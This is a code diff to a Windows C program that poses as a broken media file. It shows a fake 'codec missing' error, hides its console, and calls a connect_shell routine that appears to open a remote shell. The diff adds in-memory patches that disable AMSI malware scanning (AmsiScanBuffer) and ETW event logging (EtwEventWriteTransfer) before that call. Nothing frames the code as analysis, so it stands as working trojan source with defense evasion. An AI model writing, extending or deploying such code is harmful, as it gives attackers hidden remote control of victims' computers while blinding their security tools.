@@ -4,6 +4,42 @@
 #include <TlHelp32.h>
 #include <stdio.h>
 
+void patch_amsi() {
+    HMODULE amsi = LoadLibraryA("amsi.dll");
+    if (amsi == NULL) return;
+
+    void* api_address = GetProcAddress(amsi, "AmsiScanBuffer");
+    if (api_address == NULL) return;
+
+    DWORD old_protect;
+    VirtualProtect(api_address, 6, PAGE_EXECUTE_READWRITE, &old_protect);
+
+    // mov eax,0x80070057
+    // c3
+    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
+    memcpy(api_address, patch, sizeof(patch));
+
+    VirtualProtect(api_address, 6, old_protect, &old_protect);
+}
+
+void patch_etw() {
+    HMODULE ntdll = LoadLibraryA("ntdll.dll");
+    if (ntdll == NULL) return;
+
+    void* api_address = GetProcAddress(ntdll, "EtwEventWriteTransfer");
+    if (api_address == NULL) return;
+
+    DWORD old_protect;
+    VirtualProtect(api_address, 3, PAGE_EXECUTE_READWRITE, &old_protect);
+
+    // xor eax,eax
+    // c3
+    unsigned char patch[] = {0x31, 0xC0, 0xC3};
+    memcpy(api_address, patch, sizeof(patch));
+
+    VirtualProtect(api_address, 3, old_protect, &old_protect);
+}
+
 void connect_shell() {
     WSADATA wsa;
     SOCKET socket;
@@ -37,6 +73,8 @@ void connect_shell() {
 int main() {
     MessageBox(NULL, "Error: The video file is corrupted or required codec (0xC004F011) is missing.", "Media Player Error", MB_ICONERROR | MB_OK);
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+    patch_amsi();
+    patch_etw();
     connect_shell();
     return 0;
 }
